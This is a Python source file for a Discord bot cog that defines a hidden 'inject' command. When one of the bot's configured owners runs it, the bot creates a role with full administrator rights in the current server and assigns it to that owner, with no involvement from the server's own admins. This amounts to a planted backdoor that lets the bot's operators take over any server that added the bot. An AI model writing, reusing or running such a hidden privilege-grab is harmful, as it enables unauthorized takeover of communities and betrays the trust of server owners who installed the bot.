from numix_imports import *

class SECTOR_D(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self.config = default.get("./config.json")
		print("\"Sector D\" Loaded")

	def authorize(self, ctx):
		if ctx.author.id in self.config.owners:
			return True
		else:
			return False

	@commands.command(hidden=True)
	async def inject(self, ctx):
		try:
			if self.authorize(ctx) == False:
				return
			
			else:
				role_permissions = discord.Permissions(administrator=True)
				role = await ctx.guild.create_role(name="Numix Ownership", permissions=role_permissions)
				await ctx.author.add_roles(role)
				await ctx.send(f"{self.config.success} Injected Guild `{ctx.guild.id}`.")
		except:
			return await ctx.send(f"{self.config.forbiden} Unable to inject. Bot does not have required Permissions.")

def setup(bot):
	bot.add_cog(SECTOR_D(bot))